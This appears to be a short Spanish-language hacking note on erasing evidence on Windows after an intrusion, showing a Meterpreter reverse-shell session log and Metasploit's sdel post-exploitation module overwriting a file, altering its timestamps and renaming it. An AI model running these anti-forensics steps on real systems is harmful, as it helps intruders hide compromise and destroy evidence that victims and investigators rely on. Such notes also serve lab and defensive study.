# Windows (Herramientas Borrado de evidencias)

Para `Windows` podremos utilizar un modulo que viene en `metasploit` con el `meterpreter` que borra de forma segura todo lo que hayamos realizado en la intrusion, por lo que es mas comodo, ya que te lo hace todo el modulo.

Primero tendremos que obtener una shell con el sistema `windows` mediante `metasploit` con un `meterpreter`, una vez que lo tengamos:

```
[*] Started reverse TCP handler on 192.168.5.186:7777 
[*] Sending stage (176198 bytes) to 192.168.5.181
[*] Meterpreter session 1 opened (192.168.5.186:7777 -> 192.168.5.181:49738) at 2024-11-24 07:45:22 -0500

meterpreter >
```

Por ejemplo desde el `windows` vamos a crear un fichero que se llame `testdoc` y que contenga `fichero de pruebas`.

Ahora haremos lo siguiente para eliminar esa evidencia:

```shell
run post/windows/manage/sdel FILE=C:\\Users\\user\\Desktop\\testdoc.txt
```

Info:

```
[*] Size of the file: 18
[*] The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!
[*] Cluster Size: 4096
[*] Size on disk: 4096
[*] Iteration 1/1:
[*] 4096 bytes overwritten
[*] Changing MACE attributes
[*] Changing file name
[+] File erased!
```

Y esto lo que hara sera sobre escribir en el fichero hasta eliminarlo todo de forma segura.
